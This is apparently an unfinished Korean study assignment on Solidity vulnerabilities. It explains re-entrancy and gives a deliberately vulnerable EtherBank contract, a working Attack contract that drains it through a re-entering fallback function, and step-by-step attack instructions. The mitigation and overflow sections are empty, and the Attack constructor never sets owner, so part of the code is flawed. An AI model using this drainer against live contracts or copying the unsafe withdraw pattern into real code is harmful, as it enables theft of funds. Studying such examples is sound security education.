# 2. Ethereum 혹은 Solidity의 잘 알려진 취약점 설명, 해당 취약점을 가진 컨트랙트 구현 및 공격 (3개 이상)

<br>

## 1) Re-Entrancy

### (1) 취약점 설명

`re-entrancy` 공격은 어떤 컨트랙트가 있을 때, 해당 컨트랙트의 특정 함수를 `recursive`하게 반복적으로 재호출하도록 만들어 공격자 컨트랙트에게 ether를 연속적으로 전송하도록 만드는 공격이다. 이 때 사용되는 것은 공격 컨트랙트의 `fallback` 함수인데, `fallback` 함수는 컨트랙트에게 데이터가 없는 plain ether가 전달되었을 때, 또는 전달된 method id와 매칭되는 함수가 없을 경우 실행되는 함수이다.

공격 컨트랙트의 `fallback` 함수 안에 취약점을 가진 컨트랙트의 함수를 호출하는 코드를 작성한다. 이 때 취약점을 가진 컨트랙트의 함수 내부에는 `외부 주소(external address)`에게 ether를 전송하는 코드가 포함되어 있다.

기본적인 공격 루틴은 다음과 같다.

1. 공격 컨트랙트는 해당 취약한 컨트랙트의 함수를 호출한다.
2. 호출된 컨트랙트에서 공격 컨트랙트에게 ether를 전송한다.
3. 공격 컨트랙트의 `fallback` 함수가 실행된다.
4. 공격 컨트랙트의 `fallback` 함수에서 다시 취약한 함수를 호출하여 공격대상 컨트랙트에 재진입(`re-enter`)한다.
5. 2~4의 과정이 반복된다.
6. 공격 컨트랙트는 조건문에서 취약한 컨트랙트의 잔액을 확인하여 잔액이 충분하지 않으면 `re-entrancy` 공격을 중단한다.

<br/>

### (2) 공격 컨트랙트 예제

#### EtherBank.sol

```scala
pragma solidity ^0.4.8;

contract EtherBank {
  mapping(address => uint256) public balances;
  
  function deposit() public payable {
      balances[msg.sender] += msg.value;
  }
  
  function withdraw(uint256 _weiToWithdraw) public {
      require(balances[msg.sender] >= _weiToWithdraw);
      require(msg.sender.call.value(_weiToWithdraw)());
      balances[msg.sender] -= _weiToWithdraw;
  }
}
```


#### Attack.sol

```scala
pragma solidity ^0.4.8;

import "./EtherBank.sol";

contract Attack {
  EtherBank public etherBank;
  address private owner;
  
  constructor(address _etherBankAddress, address _owner) {
    etherBank = EtherBank(_etherBankAddress);
  }
  
  function startAttack() public payable {
    // doposit ether to EtherBank.
    etherBank.deposit.value(1 ether)();
    // withdraw ether from EtherBank.
    etherBank.withdraw(1 ether);
  }
  
  function collectEther() public {
    // the attacker collects the ether.
    require(msg.sender == owner);
    msg.sender.transfer(this.balance);
  }
  
  function () payable {
    if (etherBank.balance > 1 ether) {
        etherBank.withdraw(1 ether);
    }
  }
}
```

<br/>

1. 공격자는 `Attack` 컨트랙트를 배포하면서 공격대상이 되는 `EtherBank` 컨트랙트의 주소와 나중에 모아진 ether를 회수할 owner 주소를 설정한다.
2. 공격자는 `Attack` 컨트랙트의 `startAttack()` 함수를 호출한다. 
3. `startAttack()` 함수는 `EtherBank` 컨트랙트의 `deposit()` 함수를 호출하며 1 ether를 전송한다.
4. `EtherBank` 컨트랙트의 `deposit()` 함수는 `Attack` 컨트랙트의 balance를 증가시킨다.
5. `startAttack()` 함수는 곧 바로 `EtherBank` 컨트랙트의 `withdraw()` 함수를 호출하여 1 ether 출금을 요청한다.
6. `EtherBank` 컨트랙트의 `withdraw()` 함수는 자신을 호출한 `Attack` 컨트랙트의 balance가 충분한 것을 검사한 후에 `Attack` 컨트랙트에게 1 ether를 전송한다.
7. `Attack` 컨트랙트의 `fallback` 함수가 호출된다.
8. `fallback` 함수는 `EtherBank`의 balance를 검사한 후에 다시 `withdraw()` 함수를 호출하여 재진입(`re-enter`)한다.
9. 6~8번 과정이 반복된다.
10. `fallback` 함수에서 `EtherBank`의 balance가 충분하지 않을 경우 함수 호출을 중단한다.
11. 공격자는 `collectEther()` 함수를 호출하여 모아진 ether를 출금한다.

<br/>

### (3) 취약점 해결방법

<br/>

<br/>

## 2) Overflow / Underflow

### (1) 취약점 설명

<br/>

### (2) 공격 컨트랙트 예제

<br/>

### (3) 취약점 해결방법

<br/>
